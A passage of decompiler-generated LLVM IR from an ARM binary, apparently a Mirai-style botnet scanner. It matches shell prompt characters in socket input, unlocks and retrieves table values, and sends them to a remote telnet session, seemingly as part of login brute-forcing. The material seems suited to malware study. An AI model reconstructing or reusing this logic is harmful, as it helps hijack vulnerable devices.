  %v3_10c94 = icmp ugt i8 %v3_10c8c, 57
  store i1 %v3_10c94, i1* %cpsr_c.global-to-local, align 1
  %v8_10c94 = icmp eq i8 %v3_10c8c, 58
  store i1 %v8_10c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10c94, label %dec_label_pc_11010, label %dec_label_pc_10c9c

dec_label_pc_10c9c:                               ; preds = %bb1956
  %v2_10c9c = icmp ugt i8 %v3_10c8c, 35
  store i1 %v2_10c9c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c9c = icmp eq i8 %v3_10c8c, 36
  store i1 %v7_10c9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c9c, label %dec_label_pc_11010, label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c9c
  %v2_10ca4 = icmp ugt i8 %v3_10c8c, 34
  store i1 %v2_10ca4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ca4 = icmp eq i8 %v3_10c8c, 35
  store i1 %v7_10ca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ca4, label %dec_label_pc_11010, label %dec_label_pc_10cdc.preheader

dec_label_pc_10cdc.preheader:                     ; preds = %dec_label_pc_10ca4
  %v3_10ca8 = add i32 %v0_10710, 28
  %v2_10cac = add i32 %v3_10ca8, %v3_10c78
  store i32 %v2_10cac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10cdc

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10cdc
  %v1_10cb8 = add i32 %v0_10cc4720, -2
  %v2_10cb8 = inttoptr i32 %v1_10cb8 to i8*
  %v3_10cb8 = load i8, i8* %v2_10cb8, align 1
  %v4_10cb8 = zext i8 %v3_10cb8 to i32
  store i32 %v4_10cb8, i32* %r2.global-to-local, align 4
  %v2_10cbc = icmp ugt i8 %v3_10cb8, 61
  store i1 %v2_10cbc, i1* %cpsr_c.global-to-local, align 1
  %v7_10cbc = icmp eq i8 %v3_10cb8, 62
  store i1 %v7_10cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10cbc, label %.thread719, label %bb1957

.thread719:                                       ; preds = %dec_label_pc_10cb8
  %v1_10cc4721 = add i32 %v0_10cc4720, -1
  store i32 %v1_10cc4721, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11010

bb1957:                                           ; preds = %dec_label_pc_10cb8
  %v3_10cc0 = icmp ugt i8 %v3_10cb8, 57
  store i1 %v3_10cc0, i1* %cpsr_c.global-to-local, align 1
  %v8_10cc0 = icmp eq i8 %v3_10cb8, 58
  store i1 %v8_10cc0, i1* %cpsr_z.global-to-local, align 1
  %v1_10cc4 = add i32 %v0_10cc4720, -1
  store i32 %v1_10cc4, i32* %r3.global-to-local, align 4
  br i1 %v8_10cc0, label %dec_label_pc_11010, label %dec_label_pc_10ccc

dec_label_pc_10ccc:                               ; preds = %bb1957
  %v2_10ccc = icmp ugt i8 %v3_10cb8, 35
  store i1 %v2_10ccc, i1* %cpsr_c.global-to-local, align 1
  %v7_10ccc = icmp eq i8 %v3_10cb8, 36
  store i1 %v7_10ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ccc, label %dec_label_pc_11010, label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10ccc
  %v2_10cd4 = icmp ugt i8 %v3_10cb8, 34
  store i1 %v2_10cd4, i1* %cpsr_c.global-to-local, align 1
  %v7_10cd4 = icmp eq i8 %v3_10cb8, 35
  store i1 %v7_10cd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10cd4, label %dec_label_pc_11010, label %dec_label_pc_10cdc

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_10cdc.preheader, %dec_label_pc_10cd4
  %v0_10cc4720 = phi i32 [ %v2_10cac, %dec_label_pc_10cdc.preheader ], [ %v1_10cc4, %dec_label_pc_10cd4 ]
  %v0_10cdc = phi i32 [ %v1_10c7c, %dec_label_pc_10cdc.preheader ], [ %v1_10cdc, %dec_label_pc_10cd4 ]
  %v1_10cdc = add i32 %v0_10cdc, -1
  store i32 %v1_10cdc, i32* %r1.global-to-local, align 4
  %v2_10cdc = icmp ne i32 %v0_10cdc, 0
  store i1 %v2_10cdc, i1* %cpsr_c.global-to-local, align 1
  %v7_10cdc = icmp eq i32 %v0_10cdc, 1
  store i1 %v7_10cdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10cdc, label %dec_label_pc_10ce4, label %dec_label_pc_10cb8

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10cdc, %dec_label_pc_10c78
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_10ce8 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_10cf8 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  %v3_10cfc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10cf8, i32* %r2.global-to-local, align 4
  %v1_10d04 = add i32 %v3_10cfc, -1
  store i32 %v1_10d04, i32* %r3.global-to-local, align 4
  %v0_10d08 = load i32, i32* @sl, align 4
  store i32 %v0_10d08, i32* %r0.global-to-local, align 4
  %v0_10d0c = load i32, i32* @r6, align 4
  %v1_10d0c = add i32 %v0_10d0c, 24
  %v2_10d0c = inttoptr i32 %v1_10d0c to i32*
  %v3_10d0c = load i32, i32* %v2_10d0c, align 4
  store i32 %v3_10d0c, i32* %r1.global-to-local, align 4
  %v4_10d10 = call i32 @util_memsearch(i32 %v0_10d08, i32 %v3_10d0c, i32 %v3_10cf8, i32 %v1_10d04)
  store i32 %v4_10d10, i32* %r0.global-to-local, align 4
  %v1_10d14 = add i32 %v4_10d10, 1
  store i32 %v1_10d14, i32* @r7, align 4
  %v2_10d14 = icmp eq i32 %v4_10d10, -1
  store i1 %v2_10d14, i1* %cpsr_c.global-to-local, align 1
  %v7_10d14 = icmp eq i32 %v1_10d14, 0
  store i1 %v7_10d14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d14, label %thread-pre-split722, label %bb1958

bb1958:                                           ; preds = %dec_label_pc_10ce4
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split722

thread-pre-split722:                              ; preds = %dec_label_pc_10ce4, %bb1958
  %v0_10d1c = phi i1 [ false, %bb1958 ], [ true, %dec_label_pc_10ce4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_10d1c, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11360 = call i32 @table_lock_val(i32 25)
  br i1 %v0_10d1c, label %dec_label_pc_1135c, label %dec_label_pc_10d2c

dec_label_pc_10d2c:                               ; preds = %thread-pre-split722, %dec_label_pc_11010
  %storemerge = phi i32 [ %v1_11018, %dec_label_pc_11010 ], [ %v1_11360, %thread-pre-split722 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_10d2c = load i32, i32* @r6, align 4
  %v1_10d2c = inttoptr i32 %v0_10d2c to i32*
  %v2_10d2c = load i32, i32* %v1_10d2c, align 4
  store i32 %v2_10d2c, i32* %r3.global-to-local, align 4
  %v1_10d30 = add i32 %v0_10d2c, 4
  %v2_10d30 = inttoptr i32 %v1_10d30 to i32*
  %v3_10d30 = load i32, i32* %v2_10d30, align 4
  store i32 %v3_10d30, i32* %r0.global-to-local, align 4
  %v1_10d34 = add i32 %v2_10d2c, 13
  %v2_10d34 = inttoptr i32 %v1_10d34 to i8*
  %v3_10d34 = load i8, i8* %v2_10d34, align 1
  %v4_10d34 = zext i8 %v3_10d34 to i32
  store i32 %v4_10d34, i32* %r2.global-to-local, align 4
  %v1_10d38 = add i32 %v2_10d2c, 4
  %v2_10d38 = inttoptr i32 %v1_10d38 to i32*
  %v3_10d38 = load i32, i32* %v2_10d38, align 4
  store i32 %v3_10d38, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10d40 = call i32 @__libc_send(i32 %v3_10d30, i32 %v3_10d38, i32 %v4_10d34, i32 16384)
  store i32 %v4_10d40, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d48 = load i32, i32* @r6, align 4
  %v1_10d48 = add i32 %v0_10d48, 4
  %v2_10d48 = inttoptr i32 %v1_10d48 to i32*
  %v3_10d48 = load i32, i32* %v2_10d48, align 4
  store i32 %v3_10d48, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10d54 = call i32 @__libc_send(i32 %v3_10d48, i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32 2, i32 16384)
  store i32 %v4_10d54, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_10d5c = load i32, i32* @r6, align 4
  %v2_10d5c = add i32 %v1_10d5c, 12
  %v3_10d5c = inttoptr i32 %v2_10d5c to i32*
  store i32 5, i32* %v3_10d5c, align 4
  br label %.thread1199

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10710
  %v1_10d64 = add i32 %v0_10710, 24
  %v2_10d64 = inttoptr i32 %v1_10d64 to i32*
  %v3_10d64 = load i32, i32* %v2_10d64, align 4
  store i32 %v3_10d64, i32* %r2.global-to-local, align 4
  %v1_10d68 = add i32 %v3_10d64, -1
  store i32 %v1_10d68, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d6c = icmp eq i32 %v1_10d68, 0
  store i1 %v2_10d6c, i1* %cpsr_z.global-to-local, align 1
  %tmp1959 = icmp slt i32 %v1_10d68, 1
  br i1 %tmp1959, label %dec_label_pc_10de0, label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d64
  %v2_10d74 = add i32 %v1_10d68, %v0_10710
  store i32 %v2_10d74, i32* %r3.global-to-local, align 4
  %v1_10d78 = add i32 %v2_10d74, 28
  %v2_10d78 = inttoptr i32 %v1_10d78 to i8*
  %v3_10d78 = load i8, i8* %v2_10d78, align 1
  %v4_10d78 = zext i8 %v3_10d78 to i32
  store i32 %v4_10d78, i32* %r3.global-to-local, align 4
  %v2_10d7c = icmp ugt i8 %v3_10d78, 61
  store i1 %v2_10d7c, i1* %cpsr_c.global-to-local, align 1
  %v7_10d7c = icmp eq i8 %v3_10d78, 62
  store i1 %v7_10d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d7c, label %dec_label_pc_10fc4, label %bb1960

bb1960:                                           ; preds = %dec_label_pc_10d74
  %v3_10d80 = icmp ugt i8 %v3_10d78, 57
  store i1 %v3_10d80, i1* %cpsr_c.global-to-local, align 1
  %v8_10d80 = icmp eq i8 %v3_10d78, 58
  store i1 %v8_10d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10d80, label %dec_label_pc_10fc4, label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %bb1960
  %v2_10d88 = icmp ugt i8 %v3_10d78, 35
  store i1 %v2_10d88, i1* %cpsr_c.global-to-local, align 1
  %v7_10d88 = icmp eq i8 %v3_10d78, 36
  store i1 %v7_10d88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d88, label %dec_label_pc_10fc4, label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d88
  %v2_10d90 = icmp ugt i8 %v3_10d78, 34
  store i1 %v2_10d90, i1* %cpsr_c.global-to-local, align 1
  %v7_10d90 = icmp eq i8 %v3_10d78, 35
  store i1 %v7_10d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d90, label %dec_label_pc_10fc4, label %dec_label_pc_10d98

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10d90
  %v2_10d98 = icmp ugt i8 %v3_10d78, 36
  store i1 %v2_10d98, i1* %cpsr_c.global-to-local, align 1
  %v7_10d98 = icmp eq i8 %v3_10d78, 37
  store i1 %v7_10d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d98, label %dec_label_pc_10fc4, label %dec_label_pc_10dd8.preheader

dec_label_pc_10dd8.preheader:                     ; preds = %dec_label_pc_10d98
  %v3_10d9c = add i32 %v0_10710, 28
  %v2_10da0 = add i32 %v3_10d9c, %v3_10d64
  store i32 %v2_10da0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10dd8

dec_label_pc_10dac:                               ; preds = %dec_label_pc_10dd8
  %v1_10dac = add i32 %v0_10db8728, -2
  %v2_10dac = inttoptr i32 %v1_10dac to i8*
  %v3_10dac = load i8, i8* %v2_10dac, align 1
  %v4_10dac = zext i8 %v3_10dac to i32
  store i32 %v4_10dac, i32* %r2.global-to-local, align 4
  %v2_10db0 = icmp ugt i8 %v3_10dac, 61
  store i1 %v2_10db0, i1* %cpsr_c.global-to-local, align 1
  %v7_10db0 = icmp eq i8 %v3_10dac, 62
  store i1 %v7_10db0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10db0, label %.thread727, label %bb1961

.thread727:                                       ; preds = %dec_label_pc_10dac
  %v1_10db8729 = add i32 %v0_10db8728, -1
  store i32 %v1_10db8729, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10fc4

bb1961:                                           ; preds = %dec_label_pc_10dac
  %v3_10db4 = icmp ugt i8 %v3_10dac, 57
  store i1 %v3_10db4, i1* %cpsr_c.global-to-local, align 1
  %v8_10db4 = icmp eq i8 %v3_10dac, 58
  store i1 %v8_10db4, i1* %cpsr_z.global-to-local, align 1
  %v1_10db8 = add i32 %v0_10db8728, -1
  store i32 %v1_10db8, i32* %r3.global-to-local, align 4
  br i1 %v8_10db4, label %dec_label_pc_10fc4, label %dec_label_pc_10dc0

dec_label_pc_10dc0:                               ; preds = %bb1961
  %v2_10dc0 = icmp ugt i8 %v3_10dac, 35
  store i1 %v2_10dc0, i1* %cpsr_c.global-to-local, align 1
  %v7_10dc0 = icmp eq i8 %v3_10dac, 36
  store i1 %v7_10dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10dc0, label %dec_label_pc_10fc4, label %dec_label_pc_10dc8

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10dc0
  %v2_10dc8 = icmp ugt i8 %v3_10dac, 34
  store i1 %v2_10dc8, i1* %cpsr_c.global-to-local, align 1
  %v7_10dc8 = icmp eq i8 %v3_10dac, 35
  store i1 %v7_10dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10dc8, label %dec_label_pc_10fc4, label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10dc8
  %v2_10dd0 = icmp ugt i8 %v3_10dac, 36
  store i1 %v2_10dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_10dd0 = icmp eq i8 %v3_10dac, 37
  store i1 %v7_10dd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10dd0, label %dec_label_pc_10fc4, label %dec_label_pc_10dd8

dec_label_pc_10dd8:                               ; preds = %dec_label_pc_10dd8.preheader, %dec_label_pc_10dd0
  %v0_10db8728 = phi i32 [ %v2_10da0, %dec_label_pc_10dd8.preheader ], [ %v1_10db8, %dec_label_pc_10dd0 ]
  %v0_10dd8 = phi i32 [ %v1_10d68, %dec_label_pc_10dd8.preheader ], [ %v1_10dd8, %dec_label_pc_10dd0 ]
  %v1_10dd8 = add i32 %v0_10dd8, -1
  store i32 %v1_10dd8, i32* %r1.global-to-local, align 4
  %v2_10dd8 = icmp ne i32 %v0_10dd8, 0
  store i1 %v2_10dd8, i1* %cpsr_c.global-to-local, align 1
  %v7_10dd8 = icmp eq i32 %v0_10dd8, 1
  store i1 %v7_10dd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10dd8, label %dec_label_pc_10de0, label %dec_label_pc_10dac

dec_label_pc_10de0:                               ; preds = %dec_label_pc_10dd8, %dec_label_pc_10d64
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10de4 = call i32 @table_unlock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10dec = call i32 @table_unlock_val(i32 27)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10dfc = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_10dfc, i32* @r4, align 4
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_10e10 = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  %v3_10e14 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_10e10, 16777216
  %v1_10e18 = sdiv i32 %sext, 16777216
  store i32 %v1_10e18, i32* @r5, align 4
  %v0_10e1c = load i32, i32* @r4, align 4
  store i32 %v0_10e1c, i32* %r2.global-to-local, align 4
  %v1_10e20 = add i32 %v3_10e14, -1
  store i32 %v1_10e20, i32* %r3.global-to-local, align 4
  %v0_10e24 = load i32, i32* @sl, align 4
  store i32 %v0_10e24, i32* %r0.global-to-local, align 4
  %v0_10e28 = load i32, i32* @r6, align 4
  %v1_10e28 = add i32 %v0_10e28, 24
  %v2_10e28 = inttoptr i32 %v1_10e28 to i32*
  %v3_10e28 = load i32, i32* %v2_10e28, align 4
  store i32 %v3_10e28, i32* %r1.global-to-local, align 4
  %v4_10e2c = call i32 @util_memsearch(i32 %v0_10e24, i32 %v3_10e28, i32 %v0_10e1c, i32 %v1_10e20)
  store i32 %v4_10e2c, i32* %r0.global-to-local, align 4
  %v2_10e30 = icmp eq i32 %v4_10e2c, -1
  store i1 %v2_10e30, i1* %cpsr_c.global-to-local, align 1
  %v7_10e30 = icmp eq i32 %v4_10e2c, -1
  store i1 %v7_10e30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e30, label %dec_label_pc_10e40, label %dec_label_pc_10e68

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10de0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_10e40 = load i32, i32* %stack_var_-60, align 4
  %v0_10e44 = load i32, i32* @r5, align 4
  store i32 %v0_10e44, i32* %r2.global-to-local, align 4
  %v1_10e48 = add i32 %v3_10e40, -1
  store i32 %v1_10e48, i32* %r3.global-to-local, align 4
  %v0_10e4c = load i32, i32* @sl, align 4
  store i32 %v0_10e4c, i32* %r0.global-to-local, align 4
  %v0_10e50 = load i32, i32* @r6, align 4
  %v1_10e50 = add i32 %v0_10e50, 24
  %v2_10e50 = inttoptr i32 %v1_10e50 to i32*
  %v3_10e50 = load i32, i32* %v2_10e50, align 4
  store i32 %v3_10e50, i32* %r1.global-to-local, align 4
  %v4_10e54 = call i32 @util_memsearch(i32 %v0_10e4c, i32 %v3_10e50, i32 %v0_10e44, i32 %v1_10e48)
  store i32 %v4_10e54, i32* %r0.global-to-local, align 4
  %v1_10e58 = add i32 %v4_10e54, 1
  store i32 %v1_10e58, i32* @r7, align 4
  %v2_10e58 = icmp eq i32 %v4_10e54, -1
  store i1 %v2_10e58, i1* %cpsr_c.global-to-local, align 1
  %v7_10e58 = icmp eq i32 %v1_10e58, 0
  store i1 %v7_10e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e58, label %dec_label_pc_11378, label %dec_label_pc_10e68

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e40, %dec_label_pc_10de0
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10e6c = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10e74 = call i32 @table_lock_val(i32 27)
  store i32 %v1_10e74, i32* %r0.global-to-local, align 4
  %v0_10e78 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e78 = icmp eq i32 %v0_10e78, 0
  store i1 %v2_10e78, i1* %cpsr_z.global-to-local, align 1
  %tmp1962 = icmp slt i32 %v0_10e78, 1
  br i1 %tmp1962, label %.thread1199, label %dec_label_pc_10fd8

dec_label_pc_10e84:                               ; preds = %dec_label_pc_10710
  %v1_10e84 = add i32 %v0_10710, 24
  %v2_10e84 = inttoptr i32 %v1_10e84 to i32*
  %v3_10e84 = load i32, i32* %v2_10e84, align 4
  store i32 %v3_10e84, i32* %r2.global-to-local, align 4
  %v1_10e88 = add i32 %v3_10e84, -1
  store i32 %v1_10e88, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e8c = icmp eq i32 %v1_10e88, 0
  store i1 %v2_10e8c, i1* %cpsr_z.global-to-local, align 1
  %tmp1963 = icmp slt i32 %v1_10e88, 1
  br i1 %tmp1963, label %dec_label_pc_10694.backedge.thread, label %dec_label_pc_10e94

dec_label_pc_10e94:                               ; preds = %dec_label_pc_10e84
  %v2_10e94 = add i32 %v1_10e88, %v0_10710
  store i32 %v2_10e94, i32* %r3.global-to-local, align 4
  %v1_10e98 = add i32 %v2_10e94, 28
  %v2_10e98 = inttoptr i32 %v1_10e98 to i8*
  %v3_10e98 = load i8, i8* %v2_10e98, align 1
  %v4_10e98 = zext i8 %v3_10e98 to i32
  store i32 %v4_10e98, i32* %r3.global-to-local, align 4
  %v2_10e9c = icmp ugt i8 %v3_10e98, 61
  store i1 %v2_10e9c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e9c = icmp eq i8 %v3_10e98, 62
  store i1 %v7_10e9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e9c, label %dec_label_pc_10f00, label %bb1964

bb1964:                                           ; preds = %dec_label_pc_10e94
  %v3_10ea0 = icmp ugt i8 %v3_10e98, 57
  store i1 %v3_10ea0, i1* %cpsr_c.global-to-local, align 1
  %v8_10ea0 = icmp eq i8 %v3_10e98, 58
  store i1 %v8_10ea0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10ea0, label %dec_label_pc_10f00, label %dec_label_pc_10ea8

dec_label_pc_10ea8:                               ; preds = %bb1964
  %v2_10ea8 = icmp ugt i8 %v3_10e98, 35
  store i1 %v2_10ea8, i1* %cpsr_c.global-to-local, align 1
  %v7_10ea8 = icmp eq i8 %v3_10e98, 36
  store i1 %v7_10ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ea8, label %dec_label_pc_10f00, label %dec_label_pc_10eb0

dec_label_pc_10eb0:                               ; preds = %dec_label_pc_10ea8
  %v2_10eb0 = icmp ugt i8 %v3_10e98, 34
  store i1 %v2_10eb0, i1* %cpsr_c.global-to-local, align 1
  %v7_10eb0 = icmp eq i8 %v3_10e98, 35
  store i1 %v7_10eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eb0, label %dec_label_pc_10f00, label %dec_label_pc_10eb8

dec_label_pc_10eb8:                               ; preds = %dec_label_pc_10eb0
  %v2_10eb8 = icmp ugt i8 %v3_10e98, 36
  store i1 %v2_10eb8, i1* %cpsr_c.global-to-local, align 1
  %v7_10eb8 = icmp eq i8 %v3_10e98, 37
  store i1 %v7_10eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10eb8, label %dec_label_pc_10f00, label %dec_label_pc_10ee4.preheader

dec_label_pc_10ee4.preheader:                     ; preds = %dec_label_pc_10eb8
  %v3_10ebc = add i32 %v0_10710, 28
  %v2_10ec0 = add i32 %v3_10ebc, %v3_10e84
  store i32 %v2_10ec0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10ee4

dec_label_pc_10ecc:                               ; preds = %bb1965
  %v2_10ecc = icmp ugt i8 %v3_10eec, 35
  store i1 %v2_10ecc, i1* %cpsr_c.global-to-local, align 1
  %v7_10ecc = icmp eq i8 %v3_10eec, 36
  store i1 %v7_10ecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ecc, label %dec_label_pc_10f00, label %dec_label_pc_10ed4

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10ecc
  %v2_10ed4 = icmp ugt i8 %v3_10eec, 34
  store i1 %v2_10ed4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ed4 = icmp eq i8 %v3_10eec, 35
  store i1 %v7_10ed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ed4, label %dec_label_pc_10f00, label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10ed4
  %v2_10edc = icmp ugt i8 %v3_10eec, 36
  store i1 %v2_10edc, i1* %cpsr_c.global-to-local, align 1
  %v7_10edc = icmp eq i8 %v3_10eec, 37
  store i1 %v7_10edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10edc, label %dec_label_pc_10f00, label %dec_label_pc_10ee4

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10ee4.preheader, %dec_label_pc_10edc
  %v0_10ef8743 = phi i32 [ %v2_10ec0, %dec_label_pc_10ee4.preheader ], [ %v1_10ef8, %dec_label_pc_10edc ]
  %v0_10ee4 = phi i32 [ %v1_10e88, %dec_label_pc_10ee4.preheader ], [ %v1_10ee4, %dec_label_pc_10edc ]
  %v1_10ee4 = add i32 %v0_10ee4, -1
  store i32 %v1_10ee4, i32* %r1.global-to-local, align 4
  %v2_10ee4 = icmp ne i32 %v0_10ee4, 0
  store i1 %v2_10ee4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ee4 = icmp eq i32 %v0_10ee4, 1
  store i1 %v7_10ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ee4, label %dec_label_pc_10694.backedge.thread2185, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %dec_label_pc_10ee4
  %v1_10eec = add i32 %v0_10ef8743, -2
  %v2_10eec = inttoptr i32 %v1_10eec to i8*
  %v3_10eec = load i8, i8* %v2_10eec, align 1
  %v4_10eec = zext i8 %v3_10eec to i32
  store i32 %v4_10eec, i32* %r2.global-to-local, align 4
  %v2_10ef0 = icmp ugt i8 %v3_10eec, 61
  store i1 %v2_10ef0, i1* %cpsr_c.global-to-local, align 1
  %v7_10ef0 = icmp eq i8 %v3_10eec, 62
  store i1 %v7_10ef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ef0, label %.thread742, label %bb1965

.thread742:                                       ; preds = %dec_label_pc_10eec
  %v1_10ef8744 = add i32 %v0_10ef8743, -1
  store i32 %v1_10ef8744, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f00

bb1965:                                           ; preds = %dec_label_pc_10eec
  %v3_10ef4 = icmp ugt i8 %v3_10eec, 57
  store i1 %v3_10ef4, i1* %cpsr_c.global-to-local, align 1
  %v8_10ef4 = icmp eq i8 %v3_10eec, 58
  store i1 %v8_10ef4, i1* %cpsr_z.global-to-local, align 1
  %v1_10ef8 = add i32 %v0_10ef8743, -1
  store i32 %v1_10ef8, i32* %r3.global-to-local, align 4
  br i1 %v8_10ef4, label %dec_label_pc_10f00, label %dec_label_pc_10ecc

dec_label_pc_10f00:                               ; preds = %bb1965, %dec_label_pc_10edc, %dec_label_pc_10ed4, %dec_label_pc_10ecc, %dec_label_pc_10eb8, %dec_label_pc_10e94, %.thread742, %dec_label_pc_10eb0, %dec_label_pc_10ea8, %bb1964
  %v0_10f04 = phi i32 [ %v1_10e88, %dec_label_pc_10eb8 ], [ %v1_10e88, %dec_label_pc_10e94 ], [ %v1_10ee4, %.thread742 ], [ %v1_10e88, %dec_label_pc_10eb0 ], [ %v1_10e88, %dec_label_pc_10ea8 ], [ %v1_10e88, %bb1964 ], [ %v1_10ee4, %dec_label_pc_10ecc ], [ %v1_10ee4, %dec_label_pc_10ed4 ], [ %v1_10ee4, %dec_label_pc_10edc ], [ %v1_10ee4, %bb1965 ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10f04 = add i32 %v0_10f04, 1
  store i32 %v1_10f04, i32* @r7, align 4
  %v1_10f08 = call i32 @table_unlock_val(i32 5)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_10f18 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_10f18, i32* %r0.global-to-local, align 4
  %v3_10f1c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10f1c, i32* %r2.global-to-local, align 4
  store i32 %v3_10f18, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f28 = load i32, i32* @r6, align 4
  %v1_10f28 = add i32 %v0_10f28, 4
  %v2_10f28 = inttoptr i32 %v1_10f28 to i32*
  %v3_10f28 = load i32, i32* %v2_10f28, align 4
  store i32 %v3_10f28, i32* %r0.global-to-local, align 4
  %v4_10f2c = call i32 @__libc_send(i32 %v3_10f28, i32 %v3_10f18, i32 %v3_10f1c, i32 16384)
  store i32 %v4_10f2c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10f3c = load i32, i32* @r6, align 4
  %v1_10f3c = add i32 %v0_10f3c, 4
  %v2_10f3c = inttoptr i32 %v1_10f3c to i32*
  %v3_10f3c = load i32, i32* %v2_10f3c, align 4
  store i32 %v3_10f3c, i32* %r0.global-to-local, align 4
  %v4_10f40 = call i32 @__libc_send(i32 %v3_10f3c, i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32 2, i32 16384)
